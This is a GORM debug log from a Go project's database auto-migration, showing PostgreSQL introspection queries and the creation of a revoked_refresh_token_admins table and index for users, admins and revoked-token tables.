[0m[33m[1.485ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.032ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.972ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'password') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.086ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.077ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.031ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'locked') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.500ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'users' AND indexname = 'idx_users_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.649ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'admins' AND table_type = 'BASE TABLE'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.372ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[14.845ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'admins'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.774ms] [34;1m[rows:-][0m SELECT * FROM "admins" LIMIT 5

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[23.713ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'admins' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[25.428ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'admins'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.436ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'admins'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.140ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'admins' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'admins' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.089ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'admins' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'admins' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.126ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'admins' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'admins' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.162ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'admins' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'admins' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.235ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'admins' AND column_name = 'user_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'admins' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.361ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'admins' AND constraint_name = 'fk_admins_user'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[5.238ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'admins' AND indexname = 'idx_admins_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.763ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'admins' AND indexname = 'idx_admin_user' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.863ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_refresh_tokens' AND table_type = 'BASE TABLE'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.994ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[21.977ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_refresh_tokens'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.759ms] [34;1m[rows:-][0m SELECT * FROM "revoked_refresh_tokens" LIMIT 5

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[26.007ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'revoked_refresh_tokens' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[24.926ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'revoked_refresh_tokens'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.474ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'revoked_refresh_tokens'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.202ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_refresh_tokens' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'revoked_refresh_tokens' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.189ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_refresh_tokens' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'revoked_refresh_tokens' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.179ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_refresh_tokens' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'revoked_refresh_tokens' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.327ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_refresh_tokens' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'revoked_refresh_tokens' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.168ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_refresh_tokens' AND column_name = 'refresh_token') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'revoked_refresh_tokens' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.793ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'revoked_refresh_tokens' AND indexname = 'idx_revoked_refresh_tokens_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.539ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_refresh_token_admins' AND table_type = 'BASE TABLE'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[24.854ms] [34;1m[rows:0][0m CREATE TABLE "revoked_refresh_token_admins" ("id" bigserial,"created_at" timestamptz,"updated_at" timestamptz,"deleted_at" timestamptz,"admin_id" bigint,"revoked_refresh_token_id" bigint,PRIMARY KEY ("id"),CONSTRAINT "fk_revoked_refresh_token_admins_admin" FOREIGN KEY ("admin_id") REFERENCES "admins"("id"),CONSTRAINT "fk_revoked_refresh_token_admins_revoked_refresh_token" FOREIGN KEY ("revoked_refresh_token_id") REFERENCES "revoked_refresh_tokens"("id"))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[10.454ms] [34;1m[rows:0][0m CREATE INDEX IF NOT EXISTS "idx_revoked_refresh_token_admins_deleted_at" ON "revoked_refresh_token_admins" ("deleted_at")

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.798ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND table_type = 'BASE TABLE'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.331ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.504ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'users'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.512ms] [34;1m[rows:-][0m SELECT * FROM "users" LIMIT 5

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[9.547ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[11.699ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.651ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'users'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.020ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.126ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.572ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.150ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.200ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'user_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.078ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'first_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.161ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'last_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.154ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'middle_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.096ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.179ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.132ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'password') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.111ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.070ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
